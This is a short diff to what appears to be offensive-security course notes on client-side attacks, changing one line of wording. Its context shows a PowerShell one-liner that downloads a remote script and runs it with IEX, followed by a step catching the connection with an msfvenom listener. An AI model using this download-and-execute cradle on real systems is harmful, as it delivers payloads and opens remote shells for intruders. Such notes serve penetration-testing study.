@@ -70,7 +70,7 @@ We can execute the code of a remote script by using some Powershell methods.
     powershell (New-Object System.Net.WebClient).DownloadString('<URL>') | IEX
     ```
 
-    Replacing the \<URL\> and \<OUTFILE\> with the proper vaules.
+    Replacing the \<URL\> with the proper vaules.
 
 4. We retrieve the connection by using a [listener](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/Listener.sh).
 
